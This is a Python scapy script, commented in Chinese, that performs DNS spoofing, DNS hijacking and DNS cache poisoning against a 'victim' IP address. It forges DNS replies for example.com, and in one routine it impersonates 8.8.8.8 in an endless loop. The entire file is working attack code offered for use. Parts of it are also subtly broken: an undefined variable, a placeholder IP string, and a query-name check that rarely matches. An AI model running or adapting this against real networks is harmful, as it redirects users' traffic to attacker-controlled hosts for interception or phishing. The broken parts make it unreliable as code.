# coding=utf-8
from scapy.all import *

# 欺骗的域名和IP地址
spoofed_domain = "example.com"
spoofed_ip = "欺骗后的IP地址"

# 处理DNS请求的回调函数
def handle_dns_request(packet):
    if DNSQR in packet and packet[DNSQR].qname.decode() == spoofed_domain:
        # 构造DNS响应数据包
        dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNSQR], an=DNSRR(rrname=packet[DNSQR].qname, rdata=spoofed_ip))

        # 发送DNS响应数据包
        send(dns_response, verbose=False)

# 开始进行DNS欺骗攻击
sniff(filter="(udp and port 53) or (tcp and port 53)", prn=handle_dns_request)

# DNS劫持示例
def dns_hijack(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname
        if "example.com" in qname.decode():
            print("[+] DNS Request: {}".format(qname.decode()))
            response = DNSRR(
                rrname=qname,
                ttl=10,
                rdata="192.168.1.100"  # 替换为你想要劫持的IP地址
            )
            dns_reply = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=response
            )
            dns_response = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / dns_reply
            send(dns_response, verbose=0)
            print("[+] DNS Hijacking: {} -> 192.168.1.100".format(qname.decode()))

# DNS投毒示例
def dns_poison():
    victim_ip = "192.168.1.100"  # 替换为受害者IP地址
    poison_ip = "192.168.1.101"  # 替换为你想要投毒的IP地址
    dns_request = IP(src=victim_ip, dst="8.8.8.8") / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
    dns_reply = IP(src="8.8.8.8", dst=victim_ip) / UDP(sport=53, dport=pkt[UDP].sport) / DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd, an=DNSRR(rrname="example.com", ttl=10, rdata=poison_ip))
    send(dns_request, verbose=0)
    send(dns_reply, verbose=0)
    print("[+] DNS Poisoning: example.com -> 192.168.1.101")

# 抓取DNS流量
def sniff_dns():
    sniff(filter="udp port 53", prn=dns_hijack, store=0)

if __name__ == "__main__":
    # 开始DNS劫持
    print("Starting DNS Hijacking...")
    sniff_dns()

    # 开始DNS投毒
    print("Starting DNS Poisoning...")
    while True:
        dns_poison()
